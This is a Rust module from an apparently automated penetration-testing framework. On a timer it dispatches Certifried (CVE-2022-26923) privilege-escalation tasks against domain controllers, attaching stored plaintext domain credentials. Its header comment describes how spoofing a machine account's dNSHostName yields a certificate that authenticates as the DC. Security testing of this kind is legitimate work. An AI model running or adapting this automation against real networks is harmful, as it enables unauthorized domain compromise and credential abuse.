//! auto_certifried -- CVE-2022-26923 machine account DNS hostname spoofing.
//!
//! Certifried abuses the fact that machine accounts can enroll for certificates
//! and the DNS hostname in the certificate is derived from the machine account's
//! dNSHostName attribute. By creating a machine account and setting its
//! dNSHostName to a DC's hostname, you can obtain a certificate that
//! authenticates as the DC.
//!
//! Prerequisites:
//!   - MachineAccountQuota > 0 (default 10)
//!   - Valid domain credential
//!   - ADCS CA discovered
//!
//! Dispatches to "privesc" role with technique "certifried".

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Dispatches certifried (CVE-2022-26923) per domain with ADCS.
/// Interval: 45s.
pub async fn auto_certifried(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("certifried") {
            continue;
        }

        let work: Vec<CertifriedWork> = {
            let state = dispatcher.state.read().await;

            if state.credentials.is_empty() {
                continue;
            }

            let mut items = Vec::new();

            for (domain, dc_ip) in &state.domain_controllers {
                let dedup_key = format!("certifried:{}", domain.to_lowercase());
                if state.is_processed(DEDUP_CERTIFRIED, &dedup_key) {
                    continue;
                }

                // Find the DC host to get its hostname for spoofing
                let dc_hostname = state
                    .hosts
                    .iter()
                    .find(|h| h.ip == *dc_ip && h.is_dc)
                    .map(|h| h.hostname.clone())
                    .filter(|h| !h.is_empty());

                // Need a credential for this domain
                let cred = match state
                    .credentials
                    .iter()
                    .find(|c| {
                        c.domain.to_lowercase() == domain.to_lowercase()
                            && !c.password.is_empty()
                            && !state.is_credential_quarantined(&c.username, &c.domain)
                    })
                    .or_else(|| {
                        state.credentials.iter().find(|c| {
                            !c.password.is_empty()
                                && !state.is_credential_quarantined(&c.username, &c.domain)
                        })
                    }) {
                    Some(c) => c.clone(),
                    None => continue,
                };

                items.push(CertifriedWork {
                    dedup_key,
                    domain: domain.clone(),
                    dc_ip: dc_ip.clone(),
                    dc_hostname,
                    credential: cred,
                });
            }

            items
        };

        for item in work {
            let payload = json!({
                "technique": "certifried",
                "cve": "CVE-2022-26923",
                "target_ip": item.dc_ip,
                "domain": item.domain,
                "dc_hostname": item.dc_hostname,
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
            });

            let priority = dispatcher.effective_priority("certifried");
            match dispatcher
                .throttled_submit("exploit", "privesc", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        domain = %item.domain,
                        dc = %item.dc_ip,
                        "Certifried (CVE-2022-26923) dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_CERTIFRIED, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_CERTIFRIED, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(domain = %item.domain, "Certifried deferred");
                }
                Err(e) => {
                    warn!(err = %e, domain = %item.domain, "Failed to dispatch certifried");
                }
            }
        }
    }
}

struct CertifriedWork {
    dedup_key: String,
    domain: String,
    dc_ip: String,
    dc_hostname: Option<String>,
    credential: ares_core::models::Credential,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dedup_key_format() {
        let key = format!("certifried:{}", "contoso.local");
        assert_eq!(key, "certifried:contoso.local");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_CERTIFRIED, "certifried");
    }
}
